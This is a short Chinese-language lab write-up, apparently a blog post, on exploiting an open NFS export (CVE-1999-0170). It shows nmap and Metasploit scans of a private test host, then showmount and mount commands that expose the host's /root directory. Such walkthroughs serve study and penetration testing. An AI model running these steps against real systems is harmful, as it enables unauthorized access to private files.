---
title: NFS
category:
- [Kali, Exploit]

tags:
  - null
date: 2020-12-04 20:22:50
top:
updated:
---

NFS 网络文件系统(Network File System) 允许客户端上的用户像访问本地文件一样地访问网络上的文件


## 信息收集
```zsh
nmap -Pn -T4 -sV -p111,2049 10.211.55.6 --script rpcinfo
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-27 17:00 CST
Nmap scan report for centos-linux.shared (10.211.55.6)
Host is up (0.00050s latency).

PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      20048/tcp   mountd
  	100021  1,3,4      42555/udp6  nlockmgr
|   100024  1          34047/tcp6  status
|   100227  3           2049/tcp   nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.38 seconds
```

## NFS共享信息泄露漏洞 CVE-1999-0170



### MSF相关模块
```zsh
msf6 auxiliary(scanner/nfs/nfsmount) > show options

Module options (auxiliary/scanner/nfs/nfsmount):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PROTOCOL  udp              yes       The protocol to use (Accepted: udp, tcp)
   RHOSTS    10.211.55.6      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     111              yes       The target port (TCP)
   THREADS   1                yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/nfs/nfsmount) > run

[+] 10.211.55.6:111       - 10.211.55.6 NFS Export: / [*]
[*] 10.211.55.6:111       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### 挂载NFS
```zsh
> showmount -e 10.211.55.6   # 查看NSF服务器共享目录
Exports list on 10.211.55.6:
/root                               *

> mount -t nfs 10.211.55.6:/root /mnt  # 挂在NSF服务器共享的/root目录到本地的/mnt目录
> ls /mnt   # 查看/mnt目录的文件
anaconda-ks.cfg  index.html  index.html.1  index.html.2  original-ks.cfg

```
